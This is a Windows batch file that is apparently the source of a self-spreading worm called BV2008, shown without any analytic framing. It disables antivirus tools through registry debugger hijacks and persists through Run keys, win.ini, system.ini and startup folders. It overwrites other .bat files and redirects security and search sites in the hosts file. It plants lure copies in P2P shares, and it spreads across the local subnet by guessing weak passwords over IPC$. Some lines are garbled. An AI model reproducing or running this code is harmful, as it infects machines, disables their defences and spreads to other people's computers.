echo off
cls
@echo off
start N0TEPAD.exe
set KEY=HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
reg add "%KEY%\Mcshield5.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\VsTskMgr.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\naPrdMgr.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\UpdaterUI.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\TBMon.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\scan32.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\Ravmond.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\CCenter.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\RavTask.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\Rav.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\Ravmon.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\RavmonD.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\RavStub.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\KVXP.kxp" /v Debugger /d svchost.exe /f
reg add "%KEY%\kvMonXP.kxp" /v Debugger /d svchost.exe /f
reg add "%KEY%\KVCenter.kxp" /v Debugger /d svchost.exe /f
reg add "%KEY%\KVSrvXP.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\KRegEx.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\UIHost.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\TrojDie.kxp" /v Debugger /d svchost.exe /f
reg add "%KEY%\FrogAgent.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\cmd.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\regedit.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\Regedt32.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\freepp.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\free.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\Kav.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\Mpmon.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\ShadowSetting.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\MPSVC1.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\MPSVC2.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\MPSVC.exe" /v Debugger /d svchost.exe /f
reg add "%KEY%\PE.exe" /v Debugger /d svchost.exe /f

set a=BV2008
copy %0 %windir%\%a%.bat
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Ravupdate /t REG_SZ /d %windir%\%a%.bat /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Ravupdate /t REG_SZ /d %windir%\%a%.bat /f > nul
set BV20081=echo
%BV20081% [windows] >> %windir%\win.ini
%BV20081% run=%windir%\%a%.bat >> %windir%\win.ini
%BV20081% load=%windir%\%a%.bat >> %windir%\win.ini
%BV20081% [boot] >> %windir%\system.ini
%BV20081% shell=explorer.exe %a%.bat >> %windir%\system.ini
net share ADMIN$
net share C$
net share IPC$
net share c=c:
net share d=d:
set BV20082=echo
%BV20082% 127.0.0.1 www.google.com > %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.baidu.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.jiangmin.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.baidu.cn >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.free-av.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.antivir.de >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.antivir.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.kaspersky.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.kaspersky.de >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.microsoft.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.microsoft.de >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.sophos.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.sophos.de >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.symantec.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.hijackthis.de >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.spychecker.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.trendmicro.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.trendmicro.de >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.lavasoftusa.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.yahoo.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.yahoo.de >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.lycos.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.lycos.de >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 google.com > %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 google.de >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 symantec.de >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 free-av.de >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 free-av.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 antivir.de >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 antivir.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 kaspersky.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 kaspersky.de >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 microsoft.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 microsoft.de >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 sophos.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 sophos.de >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 symantec.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 hijackthis.de >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 spychecker.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 trendmicro.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 trendmicro.de >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 lavasoftusa.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 yahoo.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.kingsoft.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.rising.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.rising.com.cn >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 www.mmsk.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 shadu.baidu.com >> %windir%\system32\drivers\etc\hosts
%BV20082% 127.0.0.1 online.rising.com.cn >> %windir%\system32\drivers\etc\hosts
set x=%random%
copy %0 %windir%\%x%.bat > nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v html /t REG_SZ /d "%windir%\%x%.bat" /f > nul
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices" /v BV2008 /t REG_SZ /d "%windir%\%a%.bat" /f > nul
cd %windir%\system32
for %%a in (*.bat) do copy %0 %%a > nul
cd ..
for %%a in (*.bat) do copy %0 %%a > nul
copy %0 c:\autoexec.bat
md %programfiles%\BV2008\xxx\ > nul
md %programfiles%\BV2008\系统忠告\ > nul
copy %0 %programfiles%\BV2008\Winsts\Rav.txt.bat > nul
copy %0 %programfiles%\BV2008\系统忠告\keygen.exe.bat > nul
copy %0 %programfiles%\BV2008\系统忠告\serialsV7.exe.bat > nul
copy %0 %programfiles%\BV2008\系统忠告\crack_it.exe.bat > nul
echo 请使用 crack_it.exe优化操作系统 > %programfiles%\BV2008\系统忠告\说明.txt
echo 风暴胜者(www.v0day.com) I love you!> %programfiles%\BV2008\系统忠告\风暴胜者www.v0day.com I love you.txt
net share xxx&系统忠告=%programfiles%\BV2008 > nul
set BV2008a=copy
%BV2008a% %0 %programfiles%\Warez P2P Client\My Shared Folder\parishilton.txt.bat > nul
%BV2008a% %0 %programfiles%\Warez P2P Client\My Shared Folder\parishilton_movie2.jpg.bat > nul
%BV2008a% %0 %programfiles%\Warez P2P Client\My Shared Folder\parishilton_phonenumbers.txt.bat > nul
%BV2008a% %0 c:\Warez P2P Client\My Shared Folder\parishilton.txt.bat > nul
%BV2008a% %0 c:\Warez P2P Client\My Shared Folder\parishilton_movie2.jpg.bat > nul
%BV2008a% %0 c:\Warez P2P Client\My Shared Folder\parishilton_phonenumbers.txt.bat > nul
:20052
chcp 1252 > nul
%random%%BV2008%%random%%BV2008%
copy %0 "C:\Documents and Settings\All Users\Startmen Programme\Autostart\%random%.bat" > nul
copy %0 "C:\Documents and Settings\All Users\Startmen Programme\%random%.bat" > nul
copy %0 "C:\Documents and Settings\All Users\Startmen %random%.bat" > nul
copy %0 "C:\Documents and Settings\%USERNAME%\Desktop\%random%.bat" > nul
copy %0 "C:\%random%.bat" > nul
%random%%2008%%random%%2008%

for f tokens=2 delims= %%a in ('ipconfig ^ find i ip address') do (set ip=%%
a&& goto gof)
gof
set ip=%ip =%
for f tokens=1,2,3 delims=. %%b in (%ip%) do (set ip1=1
call bb %%b %%c %%d %ip1%)
bb
set IP=%1.%2.%3.%ip1%
ping %IP% -n 2  findstr i time && net use %IP%ipc$  useradministrator && copy BV2008.bat %IP%admin$ && start %IP%admin$BV2008.bat
ping %IP% -n 2  findstr i time && net use %IP%ipc$  administrator && copy BV2008.bat %IP%admin$ && start %IP%admin$BV2008.bat
ping %IP% -n 2  findstr i time && net use %IP%ipc$  stu && copy BV2008.bat %IP%admin$ && start %IP%admin$BV2008.bat
ping %IP% -n 2  findstr i time && net use %IP%ipc$  student && copy BV2008.bat %IP%admin$ && start %IP%admin$BV2008.bat
ping %IP% -n 2  findstr i time && net use %IP%ipc$  work && copy BV2008.bat %IP%admin$ && start %IP%admin$BV2008.bat
ping %IP% -n 2  findstr i time && net use %IP%ipc$  123 && copy BV2008.bat %IP%admin$ && start %IP%admin$BV2008.bat
ping %IP% -n 2  findstr i time && net use %IP%ipc$  123456 && copy BV2008.bat %IP%admin$ && start %IP%admin$BV2008.bat
ping %IP% -n 2  findstr i time && net use %IP%ipc$  baidu && copy BV2008.bat %IP%admin$ && start %IP%admin$BV2008.bat
set a ip1+=1
if %ip1% lss 255 goto bb

taskkill /f /im *监控.exe > nul
taskkill /f /im *专杀.exe > nul



goto 20052
:: BV2008 by 2008
:: Please Not user Fbsz(www.v0day.com)
:: 学会感恩 金剑安全
